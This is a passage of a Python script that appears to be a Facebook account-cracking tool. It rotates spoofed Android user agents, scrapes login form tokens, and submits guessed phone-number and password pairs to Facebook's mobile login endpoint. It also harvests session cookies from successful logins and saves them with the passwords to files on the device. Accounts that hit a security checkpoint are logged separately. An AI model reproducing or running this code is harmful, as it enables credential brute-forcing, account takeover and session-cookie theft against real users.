			'Mozilla/5.0 (Linux; Android 11; Infinix X689C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]', 
			'Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 13; Infinix X6835B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safar',
			'Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]', 
			'Mozilla/5.0 (Linux; Android 11; Infinix X6811 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]', 
			'Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]', 
			'Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]', 
			'Mozilla/5.0 (Linux; Android 12; Infinix X6516 Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.132 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]', 
			'Mozilla/5.0 (Linux; Android 11; Infinix X689D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
			#[_____Motorola____]##
			'Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v', 
			'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			#[_____Redmi____]##
			'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
			#[_____Huawei____]##
			'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			'Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
			#[_____Xiaomi ____]##
			'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36', 
			#[_____OnePlus____]##
			'Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'] 
			session = requests.Session()
			x = random.choice(colors)
			y = random.choice(colorsy)
			z = random.choice(colorsz)
			sys.stdout.write(f'\r \033[0;97m[{x}XYZ-CODERZ\033[0;97m] [\033[1;33m%s\033[0;97m/\033[0;91m%s\033[0;97m] [{y}OK:%s\033[0;97m<\033[1;91m|\033[0;97m>{z}CP:%s\033[0;97m]\r'%(loop,tl,len(oks), len(cps))),;sys.stdout.flush()
			xyzagents = random.choice(agentsxyz)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {
			'authority': 'mbasic.facebook.com',
			'method': 'POST',
			'path': '/login/device-based/login/async/',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://free.facebook.com',
			'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': xyzagents}
			lo = session.post('https://free.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				###--------------[DISPLAY TERMINAL DESIGN 1ST]--------------####
				#print(f'\r\033[1;32m╭─[•]\x1b[38;5;205m STATUS   : XYZ-OK [💚] \n\033[1;32m├─[•] TELEPHONE : '+uid+'\n├─[•] USER      : '+cid+'\n├─[•] PASSWORD  : '+ps+ '\n├─[•] CREATION  :'+joined(cid)+ '\n╰─[•]\033[0;97m COOKIE :\x1b[38;5;118m '+coki+'\n')
				###--------------[DISPLAY TERMINAL DESIGN 2ND]--------------####
				#print(f"\033[1;32m[XYZ-OK💚] '+cid+' | '+ps+' | '+joined(cid)+'\n\033[0;97m Cookie 🍪 :\x1b[38;5;118m '+coki+' \n") 
				###--------------[DISPLAY TERMINAL DESIGN 3RD]--------------####
				statusok = f'[•] USER ID  : '+cid+'\n[•] NUMBER   : '+uid+'\n[•] PASSWORD : ' +ps+ '\n[•] CREATION : '+joined(cid)+''
				statusok1 = nel(statusok, style='green')
				cetak(nel(statusok1, title=f'{H2}{date_now}{P2}'))
				cek_apk(session,coki)
				open('/sdcard/John-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				###--------------[DISPLAY TERMINAL DESIGN 1ST]--------------####
				#print(f'\r\033[1;33m╭─[\033[1;31m•\033[1;33m]\x1b[38;5;205m STATUS   : XYZ-CP \033[1;33m[💔]\n├─[\033[1;31m•\033[1;33m]\033[1;96m TELEPHONE : '+uid+'\n├─[\033[1;31m•\033[1;33m]\033[1;96m USER      : '+cid+'\n├─[\033[1;31m•\033[1;33m]\033[1;96m PASSWORD  : '+ps+ '\n├─[\033[1;31m•\033[1;33m]\033[1;96m CREATION  :'+joined(cid)+ '\n╰─[\033[1;31m•\033[1;33m] \x1b[38;5;205mUSERAGENT :\x1b[38;5;208m '+pro+'\n')
				###--------------[DISPLAY TERMINAL DESIGN 2ND]--------------####
				#print(f"\033[1;33m[XYZ-CP💔] '+cid+' | '+ps+' | '+joined(cid)+'\n") 
				###--------------[DISPLAY TERMINAL DESIGN 3RD]--------------####
				statuscp = f'[•] USER ID  : '+cid+'\n[•] NUMBER   : '+uid+'\n[•] PASSWORD : ' +ps+ '\n[•] CREATION :'+joined(cid)+''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title=f'{K2}{date_now}{P2}'))
				open('/sdcard/John-CP.txt', 'a').write(cid+' |' +ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

#IDS DISAPLAY 3 DESIGN MNY LGA DEIIY HAIN JO
#JO APKO PASSAND IEY AP CHANGE BHE KR SKTY HO 
#JUST REMOVE [#] print SE PEHLY
YounisJohn()
